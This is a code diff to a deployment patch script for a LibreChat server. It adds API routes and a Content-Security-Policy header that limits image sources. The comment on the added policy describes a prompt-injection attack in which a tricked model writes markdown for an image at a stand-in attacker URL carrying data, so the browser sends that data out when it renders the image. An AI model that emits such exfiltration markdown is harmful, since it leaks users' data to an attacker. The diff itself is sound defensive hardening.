@@ -15,6 +15,14 @@ patch(
   "  app.use('/api/auth', preAuthTenantMiddleware, routes.auth);",
   "  app.use('/api/internal/warehouse-user', require('/app/kai-platform/routes.cjs').internalWarehouseRouter);\n  app.use('/activate-account', require('/app/kai-platform/routes.cjs').activationRouter);\n  app.use('/api/kai-jobs', require('/app/kai-platform/routes.cjs').jobsRouter);\n  app.use('/api/auth', preAuthTenantMiddleware, routes.auth);",
 );
+// Prompt-injection exfiltration guard: a model tricked into writing ![](https://attacker/?d=<data>) would make the
+// browser send data out on render. Browsers enforce every CSP header, so this extra img-src policy holds alongside
+// LibreChat's own CSP (whose img-src allows any https: host and can only be widened by env).
+patch(
+  "/app/api/server/index.js",
+  "  app.disable('x-powered-by');",
+  "  app.disable('x-powered-by');\n  app.use((req, res, next) => { res.append('Content-Security-Policy', \"img-src 'self' data: blob:\"); next(); });",
+);
 patch(
   "/app/api/server/middleware/requireJwtAuth.js",
   "      tenantContextMiddleware(req, res, (tenantErr) => {",
